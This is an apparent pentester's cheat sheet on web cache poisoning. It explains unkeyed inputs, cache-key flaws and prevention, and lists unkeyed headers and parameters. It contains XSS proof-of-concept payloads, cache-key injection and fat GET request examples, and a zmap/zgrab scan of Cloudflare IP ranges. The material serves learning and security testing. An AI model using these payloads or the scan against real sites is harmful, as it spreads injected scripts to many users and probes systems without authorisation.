# Web Cache Poisoning

* **What it is**:
  Attackers trick a web cache into storing a harmful response. Other users then receive this poisoned response instead of the real one.

* **How it works**:

  1. Attacker finds an input (like a header) ignored by the cache ("unkeyed input").
  2. They insert malicious content into the server’s response.
  3. That response gets cached.
  4. Other users who load the page get the poisoned version.

* **Potential impact**:

  * Can spread XSS, redirects, or malicious scripts to many users.
  * The damage depends on what’s injected and how popular the page is.

* **Prevention**:

  * Limit or disable caching where unnecessary.
  * Only cache static (unchanging) content.
  * Disable unneeded headers.
  * Fix client-side vulnerabilities promptly.

---

```bash
curl https://www.cloudflare.com/ips-v4 | sudo zmap -p80| zgrab --port 80 --data traceReq | fgrep visit_scheme | jq -c '[.ip , .data.read]' cf80scheme | sed -E 's/\["([0-9.]*)".*colo=([A-Z]+).*/\1 \2/' | awk -F " " '!x[$2]++'
```

##  
```js
callback=alert(1)//
```
## alternative ways of adding a cache buster
```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```
## Equivalent to GET / on the back-end:

- **Apache:** `GET //`
- **Nginx:** `GET /%2F`
- **PHP:** `GET /index.php/xyz`
- **.NET:** `GET /(A(xyz)/`

`Pragma: x-get-cache-key`

## Allow Cors
```
Access-Control-Allow-Origin
```
---

## ⚡ Types of Cache Key Flaws

Here are the main tricks:

1. **Unkeyed Port**

   * Cache ignores the port (`:1337`), but the app still uses it.
   * Attackers can change redirects or inject payloads.

2. **Unkeyed Query String**

   * Cache ignores everything after `?`.
   * Example: `/home?evil=<script>` → cache treats it same as `/home`.
   * Lets attacker poison a “normal” URL.

3. **Unkeyed Query Parameter**

   * Cache ignores certain tracking parameters (`utm_source`, etc.).
   * If the app uses them, you can inject payloads.

4. **Parameter Cloaking**

   * Caches and apps parse query strings differently.
   * Example: `/page?x=1?y=evil` → cache ignores `y`, app processes it.
   * Allows sneaking payloads past the cache.

5. **Fat GET**

   * Some servers accept a **body** in GET requests.
   * Cache keys off the URL, but the app reads the body.
   * Means you can poison cache with hidden payloads.

6. **Dynamic Resource Imports**

   * Cached files like CSS/JS sometimes reflect query params.
   * You can poison shared resources like `style.css` → every page using that file is poisoned.

7. **Normalized Keys**

   * Cache may **normalize** input (treat `"><test>` and `%22%3e%3ctest%3e` the same).
   * Lets you bypass browser encoding and poison with unencoded payloads.

8. **Cache Key Injection**

   * If cache doesn’t escape delimiters when building keys, you can trick it into combining multiple requests under one poisoned response.

9. **Internal Cache Poisoning**

   * Some apps have their own **fragment caches** (store snippets of responses).
   * Poisoning one snippet may spread your payload across the entire site.

---

## 🛠 How to Test for Cache Poisoning

1. **Find a cache oracle** – a page that tells you if the response is cached (e.g., `X-Cache: hit/miss`, response time changes, or headers).
2. **Probe cache key handling** – try changing host, query params, etc., and see if the cache treats them as the same.
3. **Find a gadget** – a part of the app where your input shows up (like in HTML, JS, redirects).
4. **Combine them** – sneak input into the app while still keeping the cache key “normal.”

---

# ETC Payloads Header/parameters etc
```
GET /?utm_content='/><script>alert(1)</script>
Access-Control-Allow-Origin: * 

```

## UTM (Urchin Tracking Module)
parameters are tags added to URLs to help track the effectiveness of online marketing campaigns in Google Analytics or other analytics tools. Let me summarize the **five main UTM parameters** for clarity:


| **UTM Parameter**            | **Purpose**                                                                                   | **Example**                |
| ---------------------------- | --------------------------------------------------------------------------------------------- | -------------------------- |
| **utm\_source** *(required)* | Identifies **where the traffic is coming from** (the referrer).                               | `utm_source=google`        |
| **utm\_medium**              | Identifies the **marketing medium** (type of traffic).                                        | `utm_medium=ppc`           |
| **utm\_campaign**            | Identifies the **campaign name** (specific promotion, sale, or initiative).                   | `utm_campaign=spring_sale` |
| **utm\_term**                | Identifies **keywords or search terms** (mainly for paid search).                             | `utm_term=running+shoes`   |
| **utm\_content**             | Identifies the **specific link or creative** (useful for A/B testing and distinguishing ads). | `utm_content=logolink`     |

👉 These parameters can be placed in **any order** in the URL after a question mark (`?`) and separated by ampersands (`&`).

For example:

```
GET /?utm_content='/><script>alert(1)</script>
```

## Identify a suitable cache oracle
```
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
```
## Probe key handling
```
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```
## Unkeyed query string
Like the Host header, the request line is typically keyed. However, one of the most common cache-key transformations is to exclude the entire query string.

### Detecting an unkeyed query string
```
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```
**The following entries might all be cached separately but treated as equivalent to GET / on the back-end:**
```
Apache: GET //
Nginx: GET /%2F
PHP: GET /index.php/xyz
.NET GET /(A(xyz)/
```
## Exploiting fat GET support
```
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```

# Check unkeyed header/parameters 
**param minar automatically detect**
### 🔹High-Value **Headers** for WCP

These often get reflected or influence cache but are **not part of the cache key** (unkeyed input):

* `X-Forwarded-Host`
* `X-Forwarded-Scheme`
* `X-Forwarded-Proto`
* `X-Forwarded-For`
* `X-Forwarded-Port`
* `X-Original-URL`
* `X-Rewrite-URL`
* `X-Forwarded-Server`
* `Forwarded`
* `True-Client-IP`
* `CF-Visitor`
* `X-Host`
* `X-Forwarded-Path`
* `X-Forwarded-Query`

---

### 🔹Query Parameters (commonly unkeyed in cache)

* `utm_source`, `utm_medium`, `utm_campaign` (tracking params)
* `fbclid`, `gclid` (tracking IDs)
* `session`, `phpsessid`, `sid`
* `locale`, `lang`
* `redirect`, `next`, `url`, `returnTo`
* `preview`, `cache`, `nocache`

These are often ignored by cache keys but **may affect response HTML/headers**, which makes them dangerous.

---

### 🔹Special Cases

* **Cookies** → Sometimes caches ignore certain cookies but the app uses them (can poison responses).
* **Hop-by-Hop Headers** (`Connection`, `TE`, `Trailer`, `Upgrade`) → Some intermediaries mishandle them.
* **Content Negotiation** → `Accept`, `Accept-Encoding`, `Accept-Language` might cause subtle cache key issues.

---

### 🔹Things to Test for WCP

* Inject HTML/JS into these params/headers → see if cached & reflected.
* Add random unkeyed params (`?foo=bar`) → if response differs but cache ignores it → possible poison.
* Play with `Host` & `X-Forwarded-*` for cache key confusion.

---

# Exploiting dynamic content in resource imports

## 🔹 Concept

* A **cache key** decides if two requests are treated as the same in caching.
* Often built by concatenating path, query params, and headers with delimiters (`__`, `:`, `|`, etc.).
* If delimiters aren’t properly escaped, an attacker can **inject extra delimiters** and cause **cache key collisions**.

---

## 🔹 Attack Steps

1. **Find a keyed header/parameter** that reflects attacker input (e.g., `Origin`, `Host`, `X-Forwarded-Host`).

2. **Send a malicious request** where the payload includes the delimiter:

   ```http
   GET /path?param=123
   Origin: '-alert(1)-'__
   ```

   → Poisoned response stored in cache.

3. **Craft a second request** where the payload is in the URL (not the header):

   ```http
   GET /path?param=123__Origin='-alert(1)-'__
   ```

   → Cache key matches poisoned one, even without the header.

4. **Victim visits crafted URL** → receives poisoned cached response → XSS executes.

---

## 🔹 Why It Works

* Cache builds key like:

  ```
  /path?param=123__Origin='-alert(1)-'__
  ```
* Attacker request + Victim request generate the **same cache key**.
* Victim doesn’t need to set the special header.
* Malicious response is served from cache.

---

## 🔹 What to Test

* Look at responses for `X-Cache-Key` headers (debug info leaks).
* Try injecting cache key delimiters:

  * `__`
  * `:`
  * `|`
  * `;`
* Check if **query params** and **headers** overlap in the key.
* Use unencoded vs encoded payloads (`%5f%5f`, `%3b`) → sometimes normalize into same key.

---

## 🔹 Signs of Vulnerability

* Cache key is **reflected** in response headers (e.g., `X-Cache-Key`).
* Poisoned content is served **without needing attacker-only headers**.
* Same cache key generated for **different requests**.

---


